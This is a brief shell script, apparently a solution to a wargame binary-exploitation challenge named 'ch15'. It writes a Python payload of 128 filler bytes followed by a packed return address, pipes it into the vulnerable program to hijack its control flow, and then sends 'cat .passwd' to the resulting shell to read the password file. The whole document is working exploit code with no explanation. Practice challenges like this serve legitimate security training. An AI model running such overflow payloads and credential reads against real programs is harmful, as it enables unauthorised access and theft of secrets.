# ssh ... < commands.sh

cat << 'EOF' > /tmp/ch15_data.py
import struct
import sys

s = bytearray(b'V' * 128)
s += struct.pack('<Q', 0x8048516)

sys.stdout.buffer.write(s)
EOF

(python3 /tmp/ch15_data.py; echo; cat <<< 'cat .passwd') | ./ch15